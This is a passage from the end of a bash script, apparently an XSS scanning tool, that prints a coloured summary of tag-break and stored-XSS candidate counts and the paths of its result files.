            echo -e "  ${GREEN}[CB]${RESET} Tag-break : ${GREEN}${BOLD}$CB${RESET}  ${DIM}(crossbow recheck)${RESET}" >&2
        fi
    fi
    if [[ $SXSS_V -gt 0 ]]; then
        echo -e "  ${GREEN}[SXSS]${RESET} Stored  : ${GREEN}${BOLD}$SXSS_V${RESET}  ${DIM}(crossbow probe)${RESET}" >&2
    fi
    if [[ $SKIP_SCAN -eq 0 || $SXSS_V -gt 0 ]]; then
        echo -e "" >&2
    fi
fi
echo -e "  Results : ${DIM}$RESULTS_FILE${RESET}" >&2
if [[ $SXSS_COUNT -gt 0 ]]; then
    echo -e "  Stored  : ${DIM}$SXSS_FILE${RESET}  ${DIM}($SXSS_COUNT candidates)${RESET}" >&2
fi
echo -e "  Output  : ${DIM}$OUTDIR${RESET}" >&2
echo -e "${BOLD}══════════════════════════════════════════${RESET}" >&2
